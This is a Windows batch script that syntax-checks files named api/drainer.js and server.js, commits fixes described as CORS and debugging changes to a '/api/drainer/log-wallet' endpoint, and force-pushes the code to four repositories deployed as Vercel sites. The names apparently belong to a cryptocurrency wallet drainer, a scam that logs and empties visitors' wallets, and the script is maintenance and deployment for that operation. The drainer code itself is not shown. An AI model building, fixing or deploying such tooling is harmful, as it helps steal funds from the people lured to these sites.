@echo off
echo ========================================
echo FIX CORS AND DEBUGGING
echo ========================================
echo.
echo Changing to correct directory...
cd /d "C:\Users\popsl\Downloads\Emi-lokan-main"
echo.
echo Current directory:
cd
echo.
echo ========================================
echo ADDITIONAL FIXES APPLIED
echo ========================================
echo.
echo 1. CORS HEADERS ADDED
echo - Added CORS headers to wallet logging endpoint
echo - Added OPTIONS route for preflight requests
echo - Proper CORS handling for cross-origin requests
echo.
echo 2. ENHANCED DEBUGGING
echo - Added request method and URL logging
echo - Added request body type checking
echo - Added Content-Type header logging
echo - Added body validation
echo.
echo 3. PREFLIGHT HANDLING
echo - Added OPTIONS route for /api/drainer/log-wallet
echo - Proper preflight request handling
echo - CORS headers for all wallet logging requests
echo.
echo ========================================
echo VALIDATION
echo ========================================
echo.
echo Checking syntax...
node -c api/drainer.js
if %errorlevel% neq 0 (
    echo ERROR: api/drainer.js has syntax errors!
    pause
    exit /b 1
)
echo ✓ api/drainer.js syntax OK
echo.
node -c server.js
if %errorlevel% neq 0 (
    echo ERROR: server.js has syntax errors!
    pause
    exit /b 1
)
echo ✓ server.js syntax OK
echo.
echo ✓ HTML files don't need Node.js syntax checking
echo.
echo ========================================
echo COMMITTING FIXES
echo ========================================
echo.
git add .
git commit -m "FIX: CORS and debugging - added CORS headers, OPTIONS route, enhanced request debugging"
echo.
echo ========================================
echo FORCE PUSHING TO ALL REPOS
echo ========================================
echo.
echo Checking current branch...
for /f "tokens=*" %%i in ('git branch --show-current') do set CURRENT_BRANCH=%%i
echo Current branch: %CURRENT_BRANCH%
echo.
echo Pushing to MISUSE repository...
git remote add misuse https://github.com/SacredPath/MISUSE.git
git fetch misuse
git push misuse %CURRENT_BRANCH%:main --force
git remote remove misuse
echo.
echo Pushing to XENA repository...
git remote add xena https://github.com/SacredPath/XENA.git
git fetch xena
git push xena %CURRENT_BRANCH%:main --force
git remote remove xena
echo.
echo Pushing to Mambo repository...
git remote add mambo https://github.com/SacredPath/Mambo.git
git fetch mambo
git push mambo %CURRENT_BRANCH%:main --force
git remote remove mambo
echo.
echo Pushing to Uranus repository...
git remote add uranus https://github.com/SacredPath/Uranus.git
git fetch uranus
git push uranus %CURRENT_BRANCH%:main --force
git remote remove uranus
echo.
echo ========================================
echo FIXES DEPLOYED
echo ========================================
echo.
echo ✓ CORS headers added
echo ✓ OPTIONS route added
echo ✓ Enhanced debugging
echo ✓ All repositories updated
echo.
echo EXPECTED IMPROVEMENTS:
echo - No more 400 errors due to CORS
echo - Better debugging for request issues
echo - Proper preflight request handling
echo - Wallet type should now be logged
echo.
echo Test sites:
echo - MISUSE: https://misuse.vercel.app
echo - XENA: https://xena-brown.vercel.app
echo - Mambo: https://mambo-azure.vercel.app
echo - Uranus: https://uranus.vercel.app
echo.
echo CORS AND DEBUGGING FIXES HAVE BEEN DEPLOYED!
pause
